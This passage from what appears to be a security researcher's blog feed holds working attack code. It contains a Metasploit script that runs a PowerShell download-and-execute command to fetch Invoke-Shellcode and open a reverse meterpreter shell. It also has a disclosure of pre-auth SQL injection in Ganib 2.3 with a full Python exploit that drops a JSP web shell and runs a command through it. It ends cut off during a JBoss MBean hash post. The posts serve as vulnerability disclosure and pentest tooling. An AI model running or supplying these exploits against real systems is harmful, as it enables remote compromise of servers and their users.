<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#
</span><span class='line'># Session upgrade using Powershell IEX
</span><span class='line'># 
</span><span class='line'># Some code stolen from jduck's original implementation
</span><span class='line'>#
</span><span class='line'># -drone
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>class HTTPServer
</span><span class='line'>    #
</span><span class='line'>    # Using Ruby HTTPServer here since this isn't a module, and I can't figure
</span><span class='line'>    # out how to use MSF libs in here
</span><span class='line'>    #
</span><span class='line'>    @sent = false
</span><span class='line'>    def state
</span><span class='line'>        return @sent
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    def initialize(port, body)
</span><span class='line'>        require 'socket'
</span><span class='line'>
</span><span class='line'>        @sent = false
</span><span class='line'>        @server = Thread.new do
</span><span class='line'>            server = TCPServer.open port
</span><span class='line'>            loop do
</span><span class='line'>                client = server.accept
</span><span class='line'>                content_type = "text/plain"
</span><span class='line'>                client.puts "HTTP/1.0 200 OK\r\nContent-type: #{content_type}"\
</span><span class='line'>                            "\r\nContent-Length: #{body.length}\r\n\r\n#{body}"\
</span><span class='line'>                            "\r\n\r\n"
</span><span class='line'>                sleep 5
</span><span class='line'>                client.close
</span><span class='line'>                kill
</span><span class='line'>            end
</span><span class='line'>        end
</span><span class='line'>     end
</span><span class='line'>
</span><span class='line'>     def kill!
</span><span class='line'>        @sent = true
</span><span class='line'>        @server.kill
</span><span class='line'>     end
</span><span class='line'>
</span><span class='line'>     alias :kill :kill!
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Returns if a port is used by a session
</span><span class='line'>#
</span><span class='line'>def is_port_used?(port)
</span><span class='line'>    framework.sessions.each do |sid, obj|
</span><span class='line'>       local_info = obj.instance_variable_get(:@local_info)
</span><span class='line'>       return true if local_info =~ /:#{port}$/
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    false
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def start_http_service(port)
</span><span class='line'>    @server = HTTPServer.new(port, @pl)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def wait_payload
</span><span class='line'>
</span><span class='line'>    waited = 0
</span><span class='line'>    while (not @server.state)
</span><span class='line'>        select(nil, nil, nil, 1)
</span><span class='line'>        waited += 1
</span><span class='line'>        if (waited &gt; 10) # MAGIC NUMBA
</span><span class='line'>            @server.kill
</span><span class='line'>            raise RuntimeError, "No payload requested"
</span><span class='line'>        end
</span><span class='line'>    end
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def generate(host, port, sport)
</span><span class='line'>    require 'net/http'
</span><span class='line'>
</span><span class='line'>    script_block = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % [host, sport]
</span><span class='line'>    cmd = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol %s" % script_block
</span><span class='line'>
</span><span class='line'>    # generate powershell payload
</span><span class='line'>    url = URI.parse('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
</span><span class='line'>    req = Net::HTTP::Get.new(url.path)
</span><span class='line'>    http = Net::HTTP.new(url.host, url.port)
</span><span class='line'>    http.use_ssl = true
</span><span class='line'>
</span><span class='line'>    res = http.request(req)
</span><span class='line'>
</span><span class='line'>    if !res or res.code != '200'
</span><span class='line'>      raise RuntimeError, "Could not retrieve Invoke-Shellcode"
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    @pl = res.body
</span><span class='line'>    @pl &lt;&lt; "\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force" % [host, port]
</span><span class='line'>    return cmd
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Mimics what MSF already does if the user doesn't manually select a payload and lhost
</span><span class='line'>#
</span><span class='line'>lhost = framework.datastore['LHOST']
</span><span class='line'>unless lhost
</span><span class='line'>  lhost = Rex::Socket.source_address
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># If there is no LPORT defined in framework, then pick a random one that's not used
</span><span class='line'># by current sessions. This is possible if the user assumes module datastore options
</span><span class='line'># are the same as framework datastore options.
</span><span class='line'>#
</span><span class='line'>lport = framework.datastore['LPORT']
</span><span class='line'>unless lport
</span><span class='line'>  lport = 4444 # Default meterpreter port
</span><span class='line'>  while is_port_used?(lport)
</span><span class='line'>    # Pick a port that's not used
</span><span class='line'>    lport = [*49152..65535].sample
</span><span class='line'>  end
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># do the same from above, but for the server port
</span><span class='line'>sport = [*49152..65535].sample
</span><span class='line'>while is_port_used?(sport)
</span><span class='line'>    sport = [*49152..65535].sample
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># maybe we want our sessions going to another instance?
</span><span class='line'>use_handler = true
</span><span class='line'>use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Spawn the handler if needed
</span><span class='line'>#
</span><span class='line'>aborted = false
</span><span class='line'>begin
</span><span class='line'>
</span><span class='line'>  mh = nil
</span><span class='line'>  payload_name = 'windows/meterpreter/reverse_https'
</span><span class='line'>  if (use_handler)
</span><span class='line'>      mh = framework.modules.create("exploit/multi/handler")
</span><span class='line'>      mh.datastore['LPORT'] = lport
</span><span class='line'>      mh.datastore['LHOST'] = lhost
</span><span class='line'>      mh.datastore['PAYLOAD'] = payload_name
</span><span class='line'>      mh.datastore['ExitOnSession'] = false
</span><span class='line'>      mh.datastore['EXITFUNC'] = 'process'
</span><span class='line'>      mh.exploit_simple(
</span><span class='line'>        'LocalInput'     =&gt; session.user_input,
</span><span class='line'>        'LocalOutput'    =&gt; session.user_output,
</span><span class='line'>        'Payload'        =&gt; payload_name,
</span><span class='line'>        'RunAsJob'       =&gt; true)
</span><span class='line'>      # It takes a little time for the resources to get set up, so sleep for
</span><span class='line'>      # a bit to make sure the exploit is fully working.  Without this,
</span><span class='line'>      # mod.get_resource doesn't exist when we need it.
</span><span class='line'>      select(nil, nil, nil, 0.5)
</span><span class='line'>      if framework.jobs[mh.job_id.to_s].nil?
</span><span class='line'>        raise RuntimeError, "Failed to start multi/handler - is it already running?"
</span><span class='line'>      end
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    # Generate our command and payload
</span><span class='line'>    cmd = generate(lhost, lport, sport)
</span><span class='line'>
</span><span class='line'>    # start http service
</span><span class='line'>    start_http_service(sport)
</span><span class='line'>
</span><span class='line'>    sleep 2 # give it a sec to startup
</span><span class='line'>
</span><span class='line'>    # execute command
</span><span class='line'>    session.run_cmd(cmd)
</span><span class='line'>
</span><span class='line'>    if not @server.state
</span><span class='line'>        # wait...
</span><span class='line'>        wait_payload
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>rescue ::Interrupt
</span><span class='line'>  # TODO: cleanup partial uploads!
</span><span class='line'>  aborted = true
</span><span class='line'>rescue =&gt; e
</span><span class='line'>  print_error("Error: #{e}")
</span><span class='line'>  aborted = true
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Stop the job
</span><span class='line'>#
</span><span class='line'>if (use_handler)
</span><span class='line'>  Thread.new do
</span><span class='line'>    if not aborted
</span><span class='line'>      # Wait up to 10 seconds for the session to come in..
</span><span class='line'>      select(nil, nil, nil, 10)
</span><span class='line'>    end
</span><span class='line'>    framework.jobs.stop_job(mh.job_id)
</span><span class='line'>  end
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[introduction]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/02/introduction/"/>
    <updated>2014-03-02T22:51:11-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/02/introduction</id>
    <content type="html"><![CDATA[<p>This isn&rsquo;t a real introduction post, just a note that I&rsquo;m migrating from Google Blogger to Github Pages with Octopress.  So far it&rsquo;s great.  I&rsquo;m going to be slowly migrating all posts over from Blogger into here, though I may skip a few early posts that aren&rsquo;t as interesting.</p>

<p>Hopefully it provides me with the functionality that I&rsquo;ve been looking for.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
    <updated>2014-02-24T22:03:07-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>

<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>String theme = request.getParameter("theme");
</span><span class='line'>User user = (User) pageContext.getAttribute("user", PageContext.SESSION_SCOPE);
</span><span class='line'>if( user != null && user.getID() != null ) {
</span><span class='line'>    DBBean db = new DBBean();
</span><span class='line'>    
</span><span class='line'>    try {
</span><span class='line'>        String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
</span><span class='line'>        db.prepareStatement(query);
</span><span class='line'>        db.executePrepared();
</span><span class='line'>    } finally {
</span><span class='line'>        db.release();
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s obvious where the flaw is.</p>

<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>

<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Grab parameters from Login form
</span><span class='line'>String secure = request.getParameter ("secure");
</span><span class='line'>String username = request.getParameter ("J_USERNAME");
</span><span class='line'>username = username == null ? u_name : username;
</span><span class='line'>String password = request.getParameter ("J_PASSWORD");
</span><span class='line'>password = password == null ? pwd : password;
</span><span class='line'>String userDomain = request.getParameter("userDomain");
</span><span class='line'>
</span><span class='line'>[...]
</span><span class='line'>
</span><span class='line'>else 
</span><span class='line'>    loginManager.createLoginContext(username, password, userDomain);</span></code></pre></td></tr></table></div></figure>


<p>And the request, for reference:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /LoginProcessing.jsp HTTP/1.1
</span><span class='line'>Host: 192.168.1.219:8080
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://192.168.1.219:8080/
</span><span class='line'>Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; _sid=; _styp=; JSPRootURL=; cookies=true
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 109
</span><span class='line'>
</span><span class='line'>theAction=submit&J_USERNAME=bob%40bob.com&J_PASSWORD=password&language=en&remember_checkbox=on&userDomain=1000</span></code></pre></td></tr></table></div></figure>


<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>try
</span><span class='line'>{
</span><span class='line'>    domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
</span><span class='line'>    domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
</span><span class='line'>    statusCode = LoginStatusCode.SUCCESS;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>

<p><img class="center" src="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg"></p>

<p>Note that, so far, none of the provided input has yet to be sanitized.</p>

<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private DomainAuthenticator(String domainID, String username, String clearTextPassword)
</span><span class='line'>  throws DomainException
</span><span class='line'>{
</span><span class='line'>  try
</span><span class='line'>  {
</span><span class='line'>    UserDomain domain = new UserDomain();
</span><span class='line'>    domain.setID(domainID);
</span><span class='line'>    domain.load();
</span><span class='line'>    setDomain(domain);
</span><span class='line'>
</span><span class='line'>    setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> public void load()
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    DBBean db = new DBBean();
</span><span class='line'>    try
</span><span class='line'>    {
</span><span class='line'>      load(db);
</span><span class='line'>    } finally {
</span><span class='line'>      db.release();
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  public void load(DBBean db)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    loadProperties(db);
</span><span class='line'>
</span><span class='line'>    loadUsers(db);
</span><span class='line'>
</span><span class='line'>    loadSupportedConfigurations(db);
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> public void loadUsers(DBBean db)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    if (this.domainID == null) {
</span><span class='line'>      throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    if (this.userCollection == null) {
</span><span class='line'>      this.userCollection = new DomainUserCollection();
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    this.userCollection.setDomainID(getID());
</span><span class='line'>    this.userCollection.load(db);
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> protected void load(DBBean dbean)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();
</span><span class='line'>
</span><span class='line'>    if (this.domainID == null) {
</span><span class='line'>      throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>  [...]
</span><span class='line'>
</span><span class='line'>  dbean.executeQuery(qstrLoadUsersForDomain);</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>

<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
</span><span class='line'>[!] Dropping ./cmd.jsp on 192.168.1.64...
</span><span class='line'>[!] Dropped at /wjdll.jsp
</span><span class='line'>root@jali:~/exploits# python -c 'import requests; print requests.get("http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd").content'
</span><span class='line'>
</span><span class='line'>/var/www/ganib/tomcat/bin
</span><span class='line'>
</span><span class='line'>    1    2    3
</span><span class='line'>
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>

<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit title: Ganib 2.0 SQLi
</span><span class='line'># Date: 02/02/2014
</span><span class='line'># Exploit author: drone (@dronesec)
</span><span class='line'># More information:
</span><span class='line'># Vendor homepage: http://www.ganib.com/
</span><span class='line'># Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
</span><span class='line'># Version: &lt;= 2.3
</span><span class='line'># Fixed in: 2.4
</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3
</span><span class='line'>
</span><span class='line'>from argparse import ArgumentParser
</span><span class='line'>import sys
</span><span class='line'>import string
</span><span class='line'>import random
</span><span class='line'>import requests
</span><span class='line'>
</span><span class='line'>""" Ganib 2.0 preauth SQLi PoC
</span><span class='line'>    @dronesec
</span><span class='line'>"""
</span><span class='line'>
</span><span class='line'>def loadJSP(options):
</span><span class='line'>    data = ''
</span><span class='line'>
</span><span class='line'>    try:
</span><span class='line'>        with open(options.jsp) as f:
</span><span class='line'>            for line in f.readlines():
</span><span class='line'>                data += line.replace("\"", "\\\"").replace('\n', '')
</span><span class='line'>    except Exception, e:
</span><span class='line'>        print e
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    return data
</span><span class='line'>
</span><span class='line'>def run(options):
</span><span class='line'>    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)
</span><span class='line'>
</span><span class='line'>    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
</span><span class='line'>
</span><span class='line'>    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
</span><span class='line'>    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)
</span><span class='line'>
</span><span class='line'>    data = { "theAction" : "submit",
</span><span class='line'>             "J_USERNAME" : "test",
</span><span class='line'>             "J_PASSWORD" : "test",
</span><span class='line'>             "language" : "en",
</span><span class='line'>             "remember_checkbox" : "on",
</span><span class='line'>             "userDomain" : exploit
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    res = requests.post(url, data=data)
</span><span class='line'>    if res.status_code is 200:
</span><span class='line'>        print '[!] Dropped at /{0}.jsp'.format(shell)
</span><span class='line'>    else:
</span><span class='line'>        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>def parse():
</span><span class='line'>    parser = ArgumentParser()
</span><span class='line'>    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
</span><span class='line'>                        required=True)
</span><span class='line'>    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
</span><span class='line'>                        action='store', default='/var/www/ganib')
</span><span class='line'>    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')
</span><span class='line'>
</span><span class='line'>    options = parser.parse_args()
</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
</span><span class='line'>    return options
</span><span class='line'>
</span><span class='line'>if __name__ == "__main__":
</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fetching JBoss MBean method hashes]]></title>
    <link href="http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes/"/>
    <updated>2014-01-26T01:24:19-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes</id>
    <content type="html"><![CDATA[<p>Matasano published <a href="http://www.matasano.com/research/OWASP3011_Luca.pdf">one</a> of <a href="https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now">two</a> canonical papers on JBoss exploitation.  While working on a fresh new tool, I came across the JMXInvokerServlet technique, which uses serialized Java requests to deploy to remote MBeans.  This uses a specific object hash to route the JMX request to the correct MBean; in our case, the gold is jboss.jmx:name=Invoker.</p>

<p>In this paper, Matasano provides the hash for JBoss 4.0.3SP1, but does not list any others, nor show how it derived this.  After perusing the code, however, I found it to be quite simple, and have developed a simple method for fetching hashes of not only the Invoker MBean, but any listed in the JBoss registry.</p>

<p>To extract these values, we simply deploy a WAR file that dumps the entirety of the Registry, which is used for hash lookups when routing requests.  This can can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;%@ page import="org.jboss.system.Registry"%&gt;
</span><span class='line'>&lt;%@ page import="java.io.*"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Map"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Iterator"%&gt;
</span><span class='line'>&lt;%
</span><span class='line'>    Iterator it = Registry.entries.entrySet().iterator();
</span><span class='line'>    while (it.hasNext()){
</span><span class='line'>        Map.Entry pairs = (Map.Entry)it.next();
</span><span class='line'>        out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
</span><span class='line'>        it.remove();
</span><span class='line'>    }
</span><span class='line'>%&gt;</span></code></pre></td></tr></table></div></figure>


<p>When deployed and executed on my local 4.0.5.GA JBoss server, we get:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_hash.jpg"></p>

<p>With this, we&rsquo;ve fetched the hash for the Invoker MBean as well as every other invokable MBean in the registry.  This value appears to be common across all 3.x and 4.x JBoss instances.  However, when run against JBoss 5.x/6.x instances, the following is returned:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_hash_6x.jpg"></p>

<p>This change is due to the way look-ups are performed in 5.x; instead of the key being an Integer (hash), the key is now an Object, as shown below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
